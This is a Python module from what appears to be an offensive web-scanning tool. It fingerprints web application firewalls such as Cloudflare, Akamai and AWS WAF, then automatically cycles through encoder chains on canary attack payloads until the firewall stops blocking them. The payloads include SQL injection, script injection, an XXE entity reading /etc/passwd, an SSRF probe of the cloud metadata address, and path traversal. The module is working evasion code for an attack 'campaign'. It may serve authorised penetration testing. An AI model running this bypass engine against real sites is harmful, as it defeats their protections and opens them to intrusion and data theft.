"""
WAF detection and bypass chain iteration.

Workflow:
1. Fingerprint the WAF (header/cookie/body signature corpus)
2. Behavioral detection (benign 200 vs malicious 403)
3. Iterate encoder chains against a canary payload until the block disappears
4. Freeze the winning chain for the rest of the campaign
"""
from __future__ import annotations

import re
from typing import Optional

import structlog

from nightfall.bypass.encoders import build_chain, get_encoder_name
from nightfall.core.http import HttpPool

logger = structlog.get_logger(__name__)


# ── WAF Fingerprint Corpus ───────────────────────────────────────────────────

WAF_FINGERPRINTS: dict[str, re.Pattern] = {
    "Cloudflare": re.compile(
        r"(cloudflare|cf-ray|__cfduid|cf-cache-status|cf-request-id)", re.I
    ),
    "Akamai": re.compile(
        r"(akamai|ak_bmsc|akamai-origin-hop|x-akamai-transformed)", re.I
    ),
    "AWS WAF": re.compile(
        r"(awswaf|AWSALB|x-amzn-requestid|x-amz-apigw-id)", re.I
    ),
    "F5 BIG-IP": re.compile(
        r"(bigip|TS[0-9a-f]{5,}=|BIGipServer|f5-pool)", re.I
    ),
    "ModSecurity": re.compile(
        r"(mod_security|ModSecurity|NOYB|Mod_Security)", re.I
    ),
    "Imperva": re.compile(
        r"(incapsula|X-Iinfo|visid_incap|X-CDN.*Imperva)", re.I
    ),
    "Sucuri": re.compile(
        r"(sucuri|X-Sucuri-ID|x-sucuri-cache|Sucuri/Cloudproxy)", re.I
    ),
    "Fortinet/FortiWeb": re.compile(
        r"(fortigate|fortiweb|FORTIWAFSID)", re.I
    ),
    "Barracuda": re.compile(
        r"(barracuda|barra_counter_session|BNI__BARRACUDA)", re.I
    ),
    "Citrix NetScaler": re.compile(
        r"(netscaler|ns_af|NSC_|citrix_ns_id)", re.I
    ),
    "DenyAll": re.compile(r"(denyall|sessioncookie=)", re.I),
    "F5 ASM": re.compile(r"(TS[0-9a-f]{24}=|f5_cspm)", re.I),
}

# Canary payloads — these are designed to trigger WAF rules
CANARY_PAYLOADS = {
    "sqli": "' UNION SELECT 1,2,3,4,5--",
    "xss": '<script>alert("xss")</script>',
    "xxe": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    "ssrf": "http://169.254.169.254/latest/meta-data/",
    "generic": "../../../../../../etc/passwd",
}


class WAFBypasser:
    """WAF detection and bypass chain synthesis engine.

    Detects the WAF type via fingerprint corpus and behavioral analysis,
    then iterates through encoder chains against a canary payload until
    the block signature (403, challenge page, etc.) disappears. The winning
    chain is frozen and reused by every engine for the rest of the campaign.
    """

    def __init__(self, pool: HttpPool):
        self.pool = pool
        self.detected_waf: Optional[str] = None
        self.frozen_chain: Optional[tuple[str, str]] = None  # (chain_name, encoded)
        self.frozen_chain_names: list[str] = []  # for re-application
        self._bypass_attempts = 0
        self._bypass_found = False

    async def identify(
        self, url: str, probe_payload: str = "' OR 1=1--"
    ) -> Optional[str]:
        """Identify the WAF protecting the target.

        Two-phase detection:
        1. Passive: check response headers/cookies/body for WAF signatures
        2. Active: send a malicious-looking payload and compare with benign

        Args:
            url: Target URL to probe.
            probe_payload: Malicious payload to test behavioral blocking.

        Returns:
            WAF name string or None if no WAF detected.
        """
        # Phase 1: Passive fingerprinting
        benign_ev = await self.pool.send("GET", url)
        raw_headers = str(benign_ev.response_headers)
        raw_body = benign_ev.response_body[:4000]
        raw = raw_headers + "\n" + raw_body

        for waf_name, pattern in WAF_FINGERPRINTS.items():
            if pattern.search(raw):
                self.detected_waf = waf_name
                logger.info("waf_detected_passive", waf=waf_name, url=url)
                return waf_name

        # Phase 2: Behavioral detection
        malicious_ev = await self.pool.send(
            "GET", url, params={"q": probe_payload}
        )

        if malicious_ev.response_status in (403, 406, 429, 503) and benign_ev.response_status == 200:
            self.detected_waf = "behavioral-block"
            logger.info(
                "waf_detected_behavioral",
                benign_status=benign_ev.response_status,
                malicious_status=malicious_ev.response_status,
                url=url,
            )
            return "behavioral-block"

        # Check for challenge pages (Cloudflare, etc.)
        challenge_markers = [
            "just a moment", "checking your browser",
            "access denied", "blocked by", "security check",
            "captcha", "challenge-platform",
        ]
        if any(m in malicious_ev.response_body.lower() for m in challenge_markers):
            self.detected_waf = "challenge-page"
            logger.info("waf_detected_challenge", url=url)
            return "challenge-page"

        logger.info("waf_not_detected", url=url)
        return None

    async def break_chain(
        self,
        url: str,
        vuln_class: str,
        canary: str | None = None,
        max_attempts: int = 100,
    ) -> Optional[tuple[str, str]]:
        """Iterate encoder chains until the WAF block disappears.

        Tests encoded versions of a canary payload against the target.
        A chain "works" if the encoded payload gets a 200 (or non-block)
        and the raw canary content is NOT visible in the response body
        (confirming the encoding wasn't just decoded and reflected).

        Args:
            url: Target URL.
            vuln_class: Vulnerability class (selects encoder chain set).
            canary: Canary payload to encode. Defaults to class-specific canary.
            max_attempts: Max chains to try before giving up.

        Returns:
            (chain_name, encoded_payload) if a bypass was found, None otherwise.
        """
        # Return frozen chain if already found
        if self.frozen_chain:
            logger.info("waf_using_frozen_chain", chain=self.frozen_chain[0])
            return self.frozen_chain

        canary = canary or CANARY_PAYLOADS.get(vuln_class, CANARY_PAYLOADS["generic"])

        # First: confirm the canary IS blocked
        blocked_ev = await self.pool.send("GET", url, params={"q": canary})
        if blocked_ev.response_status == 200:
            logger.info("waf_canary_not_blocked", vuln_class=vuln_class)
            return None  # no WAF blocking for this class

        logger.info(
            "waf_bypass_start",
            vuln_class=vuln_class,
            canary_status=blocked_ev.response_status,
            waf=self.detected_waf,
        )

        attempts = 0
        for chain_name, encoded in build_chain(canary, vuln_class, depth=2):
            if attempts >= max_attempts:
                break
            attempts += 1
            self._bypass_attempts += 1

            ev = await self.pool.send("GET", url, params={"q": encoded})

            # Success criteria: non-block status AND raw canary not in response
            if ev.response_status == 200:
                # Make sure it's not just decoded and reflected back
                if canary not in ev.response_body[:2000]:
                    self.frozen_chain = (chain_name, encoded)
                    self.frozen_chain_names = chain_name.split("+")
                    self._bypass_found = True
                    logger.info(
                        "waf_bypass_found",
                        chain=chain_name,
                        attempts=attempts,
                        vuln_class=vuln_class,
                    )
                    return self.frozen_chain

        logger.warning(
            "waf_bypass_exhausted",
            attempts=attempts,
            vuln_class=vuln_class,
        )
        return None

    @property
    def stats(self) -> dict:
        return {
            "detected_waf": self.detected_waf,
            "frozen_chain": self.frozen_chain[0] if self.frozen_chain else None,
            "bypass_attempts": self._bypass_attempts,
            "bypass_found": self._bypass_found,
        }
